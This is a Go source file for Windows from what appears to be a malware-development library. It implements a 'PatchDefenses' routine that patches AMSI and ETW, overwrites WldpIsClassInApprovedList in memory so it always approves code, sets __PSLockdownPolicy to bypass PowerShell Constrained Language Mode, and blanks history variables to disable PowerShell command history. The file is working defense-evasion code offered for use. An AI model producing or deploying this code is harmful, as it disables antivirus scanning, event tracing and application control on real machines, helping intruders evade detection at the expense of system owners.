//go:build windows

package shell

import (
	"fmt"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/etw"
	"github.com/oioio-space/maldev/win/api"
	winver "github.com/oioio-space/maldev/win/version"
)

// applyEvasion applies configured evasion techniques on Windows.
func applyEvasion(cfg *EvasionConfig) error {
	if cfg == nil {
		return nil
	}

	version := winver.Current()
	var errors []error

	if cfg.PatchAMSI && version.BuildNumber >= 14393 {
		if err := patchAMSI(); err != nil {
			errors = append(errors, fmt.Errorf("AMSI: %w", err))
		}
	}

	if cfg.PatchETW && version.MajorVersion >= 10 {
		if err := patchETW(); err != nil {
			errors = append(errors, fmt.Errorf("ETW: %w", err))
		}
	}

	if cfg.BypassCLM && version.MajorVersion >= 10 {
		if err := bypassCLM(); err != nil {
			errors = append(errors, fmt.Errorf("CLM: %w", err))
		}
	}

	if cfg.PatchWLDP && version.BuildNumber >= 14393 {
		if err := patchWLDP(); err != nil {
			errors = append(errors, fmt.Errorf("WLDP: %w", err))
		}
	}

	if cfg.DisablePSHist {
		if err := disablePSHistory(); err != nil {
			errors = append(errors, fmt.Errorf("PSHistory: %w", err))
		}
	}

	if len(errors) > 0 {
		return fmt.Errorf("evasion patches (non-fatal): %v", errors)
	}

	return nil
}

// PatchDefenses applies all available evasion patches.
func PatchDefenses() error {
	return applyEvasion(&EvasionConfig{
		PatchAMSI:     true,
		PatchETW:      true,
		BypassCLM:     true,
		PatchWLDP:     true,
		DisablePSHist: true,
	})
}

// patchAMSI delegates to the canonical evasion/amsi package.
func patchAMSI() error {
	return amsi.PatchScanBuffer(nil)
}

// patchETW delegates to the canonical evasion/etw package.
func patchETW() error {
	return etw.Patch(nil)
}

// patchWLDP patches WldpIsClassInApprovedList to always return true.
func patchWLDP() error {
	wldp, err := windows.LoadDLL("wldp.dll")
	if err != nil {
		return nil // May not exist
	}
	defer wldp.Release()

	wldpIsClassInApprovedList, err := wldp.FindProc("WldpIsClassInApprovedList")
	if err != nil {
		return nil
	}

	// xor eax, eax; ret — returns S_OK (0)
	patch := []byte{0x33, 0xC0, 0xC3}
	return api.PatchMemory(wldpIsClassInApprovedList.Addr(), patch)
}

// disablePSHistory disables PowerShell command history via environment variables.
func disablePSHistory() error {
	envVars := map[string]string{
		"PSModuleAutoloadingPreference": "None",
		"HISTFILE":                      "",
		"HISTFILESIZE":                  "0",
		"HISTSIZE":                      "0",
	}

	for key, value := range envVars {
		err := windows.SetEnvironmentVariable(
			windows.StringToUTF16Ptr(key),
			windows.StringToUTF16Ptr(value),
		)
		if err != nil {
			return fmt.Errorf("SetEnvironmentVariable %s: %w", key, err)
		}
	}

	return nil
}

// bypassCLM bypasses PowerShell Constrained Language Mode.
func bypassCLM() error {
	err := windows.SetEnvironmentVariable(
		windows.StringToUTF16Ptr("__PSLockdownPolicy"),
		windows.StringToUTF16Ptr("0"),
	)
	if err != nil {
		return fmt.Errorf("SetEnvironmentVariable: %w", err)
	}

	return nil
}

// IsAdmin checks if the current process has admin privileges.
func IsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var token windows.Token
	proc, _ := windows.GetCurrentProcess()
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()

	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}

	return member
}
